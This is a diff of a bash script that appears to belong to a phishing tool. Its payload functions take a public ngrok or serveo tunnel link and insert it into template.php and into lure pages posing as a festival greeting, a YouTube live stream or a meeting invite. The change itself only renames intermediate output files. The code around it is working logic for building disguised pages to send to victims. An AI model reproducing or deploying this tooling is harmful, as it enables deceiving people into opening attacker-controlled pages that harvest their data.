@@ -232,15 +232,15 @@ payload_ngrok() {
 link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o 'https://[^/"]*\.ngrok.io')
 sed 's+forwarding_link+'$link'+g' template.php > index.php
 if [[ $option_tem -eq 1 ]]; then
-sed 's+forwarding_link+'$link'+g' festival.html > index.html
-sed 's+fes_name+'$fest_name'+g' index.html > index0.html
+sed 's+forwarding_link+'$link'+g' festival.html > index0.html
+sed 's+fes_name+'$fest_name'+g' index0.html > index2.html
 elif [[ $option_tem -eq 2 ]]; then
-sed 's+forwarding_link+'$link'+g' youtube.html > index.html
-sed 's+live_yt_tv+'$yt_video_ID'+g' index.html > index0.html
+sed 's+forwarding_link+'$link'+g' youtube.html > index0.html
+sed 's+live_yt_tv+'$yt_video_ID'+g' index0.html > index2.html
 else
-sed 's+forwarding_link+'$link'+g' meeting.html > index0.html
+sed 's+forwarding_link+'$link'+g' meeting.html > index2.html
 fi
-rm -rf index0.html
+rm -rf index2.html
 
 }
 
@@ -378,16 +378,16 @@ payload() {
 send_link=$(grep -o "https://[0-9a-z]*\.serveo.net" sendlink)
 sed 's+forwarding_link+'$send_link'+g' template.php > index.php
 if [[ $option_tem -eq 1 ]]; then
-sed 's+forwarding_link+'$link'+g' festival.html > index.html
-sed 's+fes_name+'$fest_name'+g' index.html > index0.html
+sed 's+forwarding_link+'$link'+g' festival.html > index0.html
+sed 's+fes_name+'$fest_name'+g' index0.html > index2.html
 elif [[ $option_tem -eq 2 ]]; then
-sed 's+forwarding_link+'$link'+g' youtube.html > index.html
-sed 's+live_yt_tv+'$yt_video_ID'+g' index.html > index0.html
+sed 's+forwarding_link+'$link'+g' youtube.html > index0.html
+sed 's+live_yt_tv+'$yt_video_ID'+g' index0.html > index2.html
 else
 sed 's+forwarding_link+'$link'+g' meeting.html > index0.html
-sed 's+live_yt_tv+'$yt_video_ID'+g' index.html > index0.html
+sed 's+live_yt_tv+'$yt_video_ID'+g' index0.html > index2.html
 fi
-rm -rf index0.html
+rm -rf index2.html
 
 }
 
